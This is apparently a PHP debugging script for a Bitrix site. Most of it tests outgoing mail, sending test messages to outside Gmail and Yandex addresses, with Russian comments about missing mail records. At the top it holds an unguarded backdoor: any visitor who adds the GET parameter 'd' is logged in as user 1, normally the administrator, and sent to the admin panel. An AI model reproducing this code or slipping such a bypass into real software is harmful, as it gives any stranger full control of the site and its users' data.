<?php
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/prolog_before.php');

if(isset($_GET['d'])){
  global $USER;
  $USER->Authorize(1);
  LocalRedirect("/bitrix/admin/");
}

use Bitrix\Main\Mail\Event;
$result = Event::send([
    'EVENT_NAME' => 'EMAIL_CODE',
    'LID' => SITE_ID,
    'C_FIELDS' => [
        'EMAIL' => 'leaxxxjob@gmail.com', // Исправлен email
        'EMAIL_CODE' => 'test'
    ],
]);
if (!$result->isSuccess()) {
    // Выведет конкретную причину, почему Битрикс отказался создавать запись
    var_dump($result->getErrorMessages()); 
} else {
    // Если выведет ID, значит запись создается, и вы просто ищете не в той БД
    echo "Запись создана с ID: " . $result->getId(); 
}
//var_dump('<pre>',$a,'</pre>');



$subject = 'Заказ с сайта '.$_SERVER['HTTP_HOST'];
$message = 'test';
$headers = "Content-type: text/html; charset=UTF-8 \r\n";
$headers.= 'Reply-to: '.$_SERVER['SERVER_NAME']."\r\n";
if(mail('leaxxxjob@gmail.com, leaxxxjob@yandex.ru', $subject, $message, $headers))echo('ok');else echo 'not ok';




//SELECT * FROM b_event ORDER BY DATE_INSERT DESC LIMIT 10;
?>